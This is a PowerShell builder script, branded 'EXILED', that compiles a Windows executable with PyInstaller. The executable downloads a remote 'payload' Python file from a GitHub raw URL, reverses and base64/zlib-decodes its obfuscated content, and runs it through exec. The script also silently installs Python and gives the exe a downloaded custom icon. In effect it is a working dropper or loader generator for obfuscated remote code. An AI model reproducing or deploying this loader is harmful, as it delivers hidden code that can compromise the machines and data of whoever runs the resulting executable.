[CmdletBinding()]
param(
    [string]$Out = "exiled",
    [string]$Icon = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/halloween.png",
    [string]$PayloadUrl = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py",
    [string]$Dir,
    [switch]$NoIcon,
    [switch]$KeepBuild
)

$ErrorActionPreference = "Stop"

if ($PSVersionTable.PSVersion.Major -ge 7) {
    $PSNativeCommandUseErrorActionPreference = $false
}

$OutName = $Out
$UseIcon = -not $NoIcon

# C# helper to run processes silently and capture output without PS 5.1 throwing NativeCommandError
$CSharpCode = @"
using System;
using System.Diagnostics;
public class ProcessRunner {
    public static int Run(string exe, string args, out string output) {
        Process p = new Process();
        p.StartInfo.FileName = exe;
        p.StartInfo.Arguments = args;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.CreateNoWindow = true;
        p.Start();
        output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
        p.WaitForExit();
        return p.ExitCode;
    }
}
"@
Add-Type -TypeDefinition $CSharpCode -ErrorAction SilentlyContinue

function Log {
    param([string]$Type, [string]$Text)
    $time = (Get-Date).ToString("HH:mm:ss")
    switch ($Type) {
        "error"   { Write-Host "[$time] [FAIL] $Text" -ForegroundColor Red }
        "warning" { Write-Host "[$time] [WARN] $Text" -ForegroundColor Yellow }
        "success" { Write-Host "[$time] [ OK ] $Text" -ForegroundColor Green }
        default   { Write-Host "[$time] [INFO] $Text" -ForegroundColor DarkGray }
    }
}

$Arch = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
$PythonExe = $null

foreach ($cand in @("python", "py", "python3")) {
    $cmd = Get-Command $cand -ErrorAction SilentlyContinue
    if ($cmd) {
        $null = [ProcessRunner]::Run($cmd.Source, "-c `"import sys`"", [ref]$null)
        $PythonExe = $cmd.Source
        break
    }
}

if (-not $PythonExe) {
    Log warning "Valid Python not found on PATH. Initiating auto-install..."
    $pyVersion = "3.11.9"
    $pyArch = if ($Arch -eq "x64") { "amd64" } else { "win32" }
    $pyInstallerUrl = "https://www.python.org/ftp/python/$pyVersion/python-$pyVersion-$pyArch.exe"
    $pyInstallerPath = Join-Path $env:TEMP "python_installer.exe"
    
    Log info "Downloading Python $pyVersion ($pyArch)..."
    try {
        Invoke-WebRequest -Uri $pyInstallerUrl -OutFile $pyInstallerPath -UseBasicParsing
    } catch {
        Log error "Failed to download Python installer."
        exit 1
    }
    
    Log info "Installing Python silently..."
    Start-Process -FilePath $pyInstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0" -Wait
    
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    
    foreach ($cand in @("python", "py", "python3")) {
        $cmd = Get-Command $cand -ErrorAction SilentlyContinue
        if ($cmd) {
            $null = [ProcessRunner]::Run($cmd.Source, "-c `"import sys`"", [ref]$null)
            $PythonExe = $cmd.Source
            break
        }
    }
    
    if (-not $PythonExe) {
        Log error "Auto-install failed or executable is invalid. Please install Python manually."
        exit 1
    }
    Log success "Python successfully installed."
}

$UseCurl = $null -ne (Get-Command curl.exe -ErrorAction SilentlyContinue)
if (-not $UseCurl) {
    $IWR = Get-Command Invoke-WebRequest -ErrorAction SilentlyContinue
    if (-not $IWR) {
        Log error "Neither curl.exe nor Invoke-WebRequest available."
        exit 1
    }
}

if ($Dir) {
    $Here = (Resolve-Path -LiteralPath $Dir).Path
} else {
    $Here = (Get-Location).Path
}
$Work     = Join-Path $Here "_build"
$Stub     = Join-Path $Work "payload.py"
$IconRaw  = Join-Path $Work "icon.raw"
$IconIco  = Join-Path $Work "icon.ico"
$DistDir  = Join-Path $Here "dist"

Write-Host ""
Write-Host "  ███████╗██╗  ██╗██╗██╗     ███████╗██████╗ " -ForegroundColor DarkYellow
Write-Host "  ██╔════╝╚██╗██╔╝██║██║     ██╔════╝██╔══██╗" -ForegroundColor DarkYellow
Write-Host "  █████╗   ╚███╔╝ ██║██║     █████╗  ██║  ██║" -ForegroundColor DarkYellow
Write-Host "  ██╔══╝   ██╔██╗ ██║██║     ██╔══╝  ██║  ██║" -ForegroundColor DarkYellow
Write-Host "  ███████╗██╔╝ ██╗██║███████╗███████╗██████╔╝" -ForegroundColor DarkYellow
Write-Host "  ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝ " -ForegroundColor DarkYellow
Write-Host ""
Log info "Building $OutName for windows-$Arch"
Log info "Output directory: $Here"

$ExePath = Join-Path $DistDir "$OutName.exe"
if (Test-Path -LiteralPath $ExePath) {
    Log info "Found existing $OutName.exe. Removing..."
    try {
        Remove-Item -LiteralPath $ExePath -Force
        Log success "Deleted old executable."
    } catch {
        Log error "Failed to delete existing EXE. Is it currently running?"
        exit 1
    }
}

New-Item -ItemType Directory -Force -Path $Work | Out-Null
New-Item -ItemType Directory -Force -Path $DistDir | Out-Null

Log info "Calculating SHA-256 hash of remote payload for integrity lock..."
$payloadHash = ""
try {
    $req = [System.Net.WebRequest]::Create($PayloadUrl)
    $req.UserAgent = "Mozilla/5.0"
    $resp = $req.GetResponse()
    $stream = $resp.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $payloadContent = $reader.ReadToEnd()
    $reader.Close()
    $stream.Close()
    
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payloadContent)
    $hashBytes = $sha.ComputeHash($bytes)
    $payloadHash = [System.BitConverter]::ToString($hashBytes).Replace("-", "").ToLower()
    
    Log success "Hash locked: $payloadHash"
} catch {
    Log error "Failed to fetch and hash the remote payload. Aborting to prevent execution of unverified code."
    exit 1
}

$stubBody = @"
import urllib.request
import base64
import zlib
import re
import ctypes
import ctypes.wintypes
import tkinter
import hashlib

URL = '$PayloadUrl'
EXPECTED_HASH = '$payloadHash'

def fetch(url):
    req = urllib.request.Request(
        url,
        headers={'User-Agent': 'Mozilla/5.0'}
    )
    with urllib.request.urlopen(req, timeout=15) as response:
        return response.read().decode('utf-8')

def deobfuscate(src):
    match = re.search(r'_\)\(b\'([^\']+)\'', src)
    if not match:
        return src
    payload = match.group(1)[::-1]
    decoded = base64.b64decode(payload, validate=True)
    return zlib.decompress(decoded).decode('utf-8')

def main():
    raw = fetch(URL)
    
    if EXPECTED_HASH:
        current_hash = hashlib.sha256(raw.encode('utf-8')).hexdigest()
        if current_hash != EXPECTED_HASH:
            raise ValueError('Security Alert: Payload hash mismatch. Execution aborted.')
            
    decoded = deobfuscate(raw)
    exec(compile(decoded, '<remote>', 'exec'), {
        '__name__': '__main__'
    })

if __name__ == '__main__':
    main()
"@
Set-Content -Path $Stub -Value $stubBody -Encoding UTF8

if ($UseIcon) {
    if ($Icon -match '^https?://') {
        Log info "Fetching icon..."
        $downloadSuccess = $false
        try {
            if ($UseCurl) {
                & curl.exe -fsSL -A "Mozilla/5.0" $Icon -o $IconRaw 2>$null
                if ($LASTEXITCODE -eq 0) { $downloadSuccess = $true }
            } else {
                Invoke-WebRequest -Uri $Icon -Headers @{ "User-Agent" = "Mozilla/5.0" } -OutFile $IconRaw
                $downloadSuccess = $true
            }
        } catch {
            $downloadSuccess = $false
        }
        
        if (-not $downloadSuccess -or -not (Test-Path -LiteralPath $IconRaw)) {
            Log error "Failed to download icon. Aborting build to prevent blank icon."
            exit 1
        }
    } else {
        if (-not (Test-Path -LiteralPath $Icon)) {
            Log error "Icon file not found at $Icon. Aborting build."
            exit 1
        } else {
            Copy-Item -LiteralPath $Icon -Destination $IconRaw -Force
        }
    }
}

Log info "Installing build dependencies..."
$pipOut = ""
$pipExit = [ProcessRunner]::Run($PythonExe, "-m pip install --quiet --upgrade pyinstaller pillow", [ref]$pipOut)

if ($pipExit -ne 0) {
    Log error "Failed to install build dependencies."
    Write-Host $pipOut -ForegroundColor Red
    exit 1
}

if ($UseIcon) {
    Log info "Converting icon to .ico..."
    $conv = @'
from PIL import Image
try:
    img = Image.open(r'__ICON_RAW__')
    if img.mode != 'RGBA':
        img = img.convert('RGBA')
    img.save(r'__ICON_ICO__', format='ICO', sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)])
except Exception as e:
    print(f"Icon conversion failed: {e}")
    exit(1)
'@
    $conv = $conv -replace '__ICON_RAW__', $IconRaw -replace '__ICON_ICO__', $IconIco
    $convTmp = Join-Path $Work "_icon_conv.py"
    Set-Content -Path $convTmp -Value $conv -Encoding UTF8
    
    $convOut = ""
    $convExit = [ProcessRunner]::Run($PythonExe, "`"$convTmp`"", [ref]$convOut)
    
    if ($convExit -ne 0) {
        Log error "Icon conversion failed. Aborting build."
        Write-Host $convOut -ForegroundColor Red
        exit 1
    }
}

Log info "Freezing executable..."

$pyiArgs = @(
    "-m", "PyInstaller",
    "--onefile",
    "--noconfirm",
    "--clean",
    "--hidden-import", "ctypes",
    "--hidden-import", "ctypes.wintypes",
    "--hidden-import", "tkinter",
    "--collect-all", "ctypes",
    "--collect-all", "tkinter",
    "--name", $OutName,
    "--distpath", $DistDir,
    "--workpath", (Join-Path $Work "pyi"),
    "--specpath", $Work
)
if ($UseIcon -and (Test-Path $IconIco)) {
    $pyiArgs += @("--icon", $IconIco)
}
$pyiArgs += $Stub

$pyiArgsString = $pyiArgs -join " "
$pyiOut = ""
$pyiExit = [ProcessRunner]::Run($PythonExe, $pyiArgsString, [ref]$pyiOut)

if ($pyiExit -ne 0) {
    Log error "PyInstaller failed with exit code $pyiExit."
    Write-Host $pyiOut -ForegroundColor Red
    exit 1
}

if (-not $KeepBuild) {
    Remove-Item -Recurse -Force $Work -ErrorAction SilentlyContinue
}

Write-Host ""
Write-Host "  ┌──────────────────────────────────────────────┐" -ForegroundColor DarkGray
Write-Host "  │  Build Complete!                             │" -ForegroundColor DarkGray
Write-Host "  └──────────────────────────────────────────────┘" -ForegroundColor DarkGray
Log success "Executable compiled successfully."
Log info "Output: $ExePath"
Log info "Target Architecture: Windows $Arch"
Log info "Run command: & `"$ExePath`""
Write-Host ""
